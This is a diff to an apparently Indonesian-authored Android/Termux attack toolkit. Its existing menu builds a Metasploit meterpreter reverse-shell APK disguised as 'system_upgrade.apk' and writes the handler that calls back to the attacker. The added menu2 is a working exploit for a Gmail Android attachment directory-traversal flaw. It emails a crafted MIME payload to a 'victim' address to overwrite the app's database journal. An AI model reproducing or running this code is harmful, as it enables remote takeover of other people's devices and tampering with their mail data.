@@ -1,7 +1,14 @@
 #!/data/data/com.termux/files/usr/bin/python2
 # -*- coding: utf-8 -*-
 
-import subprocess, sys, os, socket
+import subprocess, sys, getpass, os, socket, smtplib, mimetypes, random
+from email import encoders
+from email.message import Message
+from email.mime.audio import MIMEAudio
+from email.mime.base import MIMEBase
+from email.mime.image import MIMEImage
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 
 sys.path.append("/data/data/com.termux/files/usr/share/txtool/core")
 from fungsi import warna, IP2, txtool_dir, finish_exploit, IP
@@ -29,7 +36,7 @@ def canceled():
 def empty():
     try:
         print(warna.kuning + "\n[!] " + warna.tutup + "Warning. your input is empty, txtool will be assume exploitation is canceled")
-        raw_input("\n    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue  ")
+        raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue  ")
 
     except KeyError:
         pass
@@ -38,13 +45,13 @@ def empty():
 def menu1():
     alamat_ip = IP2()
     lhost = alamat_ip
-    port = raw_input(warna.biru + "\n[+] " + warna.tutup + " Enter Port for reverse listener [1492]" + warna.kuning + "  >> " + warna.tutup)
+    port = raw_input(warna.biru + "\n[+]" + warna.tutup + " Enter Port for reverse listener [1492]" + warna.kuning + "  >> " + warna.tutup)
     if port == "": port = "1492"
     payload = 'android/meterpreter/reverse_tcp'
-    print(warna.hijau + "\n[*] " + warna.tutup + " creating mallicious app, please wait a moment...")
+    print(warna.hijau + "\n[*]" + warna.tutup + " creating mallicious app, please wait a moment...")
     subprocess.Popen("%s/msfvenom -p %s LHOST=%s LPORT=%s R> %s/system_upgrade.apk" %
         (metasploit_path, payload, lhost, port, txtool_dir),stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True).wait()
-    print(warna.hijau + "\n[*] " + warna.tutup + " successfully creating mallicious app, apk file has been saved to %s/system_upgrade.apk\n" %
+    print(warna.hijau + "\n[*]" + warna.tutup + " successfully creating mallicious app, apk file has been saved to %s/system_upgrade.apk\n" %
         (txtool_dir))
     filewrite = open(txtool_dir + "/payload.rc", "w")
     filewrite.write("use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nexploit -j\r\n\r\n" %
@@ -68,6 +75,127 @@ def menu1():
         except KeyError:
             kembali()
 
+def menu2():
+    '''
+Author : Google Security Research
+Source : https://www.exploit-db.com/exploits/43189/
+Source : https://bugs.chromium.org/p/project-zero/issues/detail?id=1342
+
+'''
+    IP()
+    print(warna.kuning + "\n[!] " + warna.tutup + "There is a directory traversal issue in attachment downloads in Gmail. For non-gmail accounts, there is no path sanitization on the attachment filename in the email, so when attachments are downloaded, a file with any name and any contents can be written to anywhere on the filesystem that the Gmail app can access.")
+    print(warna.kuning + "\n[!] " + warna.tutup + "This should be your email address")
+    FROM_ADDRESS = raw_input(warna.biru + "[+] " + warna.tutup + "email adress" + warna.kuning + "  >>  " + warna.tutup)
+    if FROM_ADDRESS == "":
+        empty()
+        kembali()
+
+    if "@" and "." not in FROM_ADDRESS:
+        print(warna.merah + "\n[x] " + warna.tutup + "email address not valid, double check your input before hit Enter button")
+        raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue  ")
+        kembali()
+
+    print(warna.kuning + "\n[!] " + warna.tutup + "enable POP/IMAP forwarding in your account and to avoid google blocking messages you can use App Passwords (16 digit passcode), or allowing less secure apps in your account.")
+    print(warna.kuning + "[!] " + warna.tutup + "learn more : https://support.google.com/mail/answer/7126229#cantsignin")
+#    print(warna.kuning + "\n[!] " + warna.tutup + "be carefull, watch your keyboard. password is invisible.")
+#    YOUR_CREDENTIAL = getpass.getpass(warna.biru + "[+] " + warna.tutup + "Password" +warna.kuning + "  >>  " + warna.tutup)
+    YOUR_CREDENTIAL = raw_input(warna.biru + "[+] " + warna.tutup + "Password" + warna.kuning + "  >>  " + warna.tutup)
+    if YOUR_CREDENTIAL == "":
+        empty()
+        kembali()
+
+    print(warna.kuning + "\n[!] " + warna.tutup + "Messages subject")
+    SUBJECT = raw_input(warna.biru + "[+] " + warna.tutup + "subject" + warna.kuning + "  >>  " + warna.tutup)
+    if SUBJECT == "":
+        empty()
+        kembali()
+
+    print(warna.kuning + "\n[!] " + warna.tutup + "Write your messages")
+    MESSAGE = raw_input(warna.biru + "[+] " + warna.tutup + "Messages" + warna.kuning + "  >>  " + warna.tutup)
+    if MESSAGE == "":
+        empty()
+        kembali()
+
+    print(warna.kuning + "\n[!] " + warna.tutup + "this should be the victim email address")
+    TO_ADDRESS = raw_input(warna.biru + "[+] " + warna.tutup + "to address" + warna.kuning + "  >>  " + warna.tutup)
+    if TO_ADDRESS == "":
+        empty()
+        kembali()
+
+    if "@" and "." not in TO_ADDRESS:
+        print(warna.merah + "\n[x] " + warna.tutup + "email address not valid, double check your input before hit Enter button")
+        raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue  ")
+        kembali()
+
+    composed = """Content-Type: multipart/signed; protocol="application/x-pkcs7-signature"; micalg=sha1; boundary="----714A286D976BF3E58D9D671E37CBCF7C"
+MIME-Version: 1.0
+Subject: """+ SUBJECT +"""
+To: """+ TO_ADDRESS +"""
+From: """ + FROM_ADDRESS + """
+
+You will not see this in a MIME-aware mail reader.
+
+------714A286D976BF3E58D9D671E37CBCF7C
+Content-Type: text/html
+
+<html><body><b>"""+ MESSAGE +"""</b></body></html>
+
+------714A286D976BF3E58D9D671E37CBCF7C
+Content-Type: audio/wav; name="../../../../data/data/com.google.android.gm/databases/EmailProviderBody.db-journal"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="%2e%2e%2fqpng"
+
+2dUF+SChY9f/////AAAAABAAAAAAAQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGRyb2lkX21l
+dGFkYXRhYW5kcm9pZF9tZXRhZGF0YQNDUkVBVEUgVEFCTEUgAAAARlkAAABFSgAAAEs7AAAASSw=
+
+------714A286D976BF3E58D9D671E37CBCF7C"""
+
+    print(warna.hijau + "\n[*] " + warna.tutup + "Sending email, please wait a moment...")
+    try:
+        target = TO_ADDRESS
+        send = smtplib.SMTP_SSL("smtp.gmail.com")
+
+    except smtplib.socket.gaierror as a:
+        print warna.merah + "\n[x] " + warna.tutup + "An error occured :" ,a
+        print warna.merah + "\n[x] " + warna.tutup + "Sending email failed"
+        raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue  ")
+        kembali()
+
+    try:
+        send.login(FROM_ADDRESS, YOUR_CREDENTIAL)
+
+    except smtplib.SMTPAuthenticationError as b:
+        print warna.merah + "\n[x] " + warna.tutup + "An error occured :" ,b
+        send.quit()
+        print warna.merah + "\n[x] " + warna.tutup + "Sending email failed"
+        raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue  ")
+        kembali()
+
+    try:
+        send.sendmail(FROM_ADDRESS, target, composed)
+        return True
+
+    except Exception:
+        print warna.merah + "\n[x] " + warna.tutup + "An error occured :"
+        print warna.merah + "\n[x] " + warna.tutup + "Sending email failed"
+        raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue  ")
+        kembali()
+
+    except KeyError:
+        kembali()
+
+    finally:
+        send.quit()
+        print(warna.hijau + "\n[*] " + warna.tutup + "email has been successfully sent to %s" % (TO_ADDRESS))
+        finish_exploit()
+        kembali()
 
 def menu5():
     IP()
